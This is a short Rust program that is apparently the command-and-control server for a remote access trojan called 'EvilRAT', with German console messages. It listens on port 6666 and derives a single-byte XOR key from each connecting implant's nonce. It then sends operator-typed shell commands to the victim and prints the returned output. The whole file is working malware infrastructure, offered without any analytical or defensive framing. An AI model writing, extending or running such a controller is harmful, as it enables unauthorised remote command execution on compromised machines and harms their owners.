use std::io::{self, Write, Read};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::str;

fn main() -> io::Result<()> {
    let listener = TcpListener::bind("0.0.0.0:6666")?;
    println!("EvilRAT C2 lauscht ...");
    for stream in listener.incoming() {
        let mut stream = stream?;
        thread::spawn(move || {
            let mut nonce = [0u8;4];
            if stream.read_exact(&mut nonce).is_err() { return; }
            let key = nonce[0] ^ nonce[1] ^ nonce[2] ^ nonce[3];
            println!("[+] Verbindung, XOR-Key={:02X?}", key);
          
            loop {
                print!("RAT> ");
                io::stdout().flush().unwrap();
                let mut input = String::new();
                io::stdin().read_line(&mut input).unwrap();
                let cmd = input.trim();
                let mut buf = vec![0x01u8]; // Typ Shell
                buf.extend(cmd.as_bytes());
                // XOR enc
                for b in &mut buf { *b ^= key; }
                if stream.write_all(&buf).is_err() { break; }
          
                let mut resp = vec![0u8;8192];
                match stream.read(&mut resp) {
                    Ok(n) => {
                        let dec: Vec<u8> = resp[..n].iter().map(|b| b ^ key).collect();
                        print!("{}", String::from_utf8_lossy(&dec));
                    },
                    _ => break,
                }
            }
        });
    }
    Ok(())
}
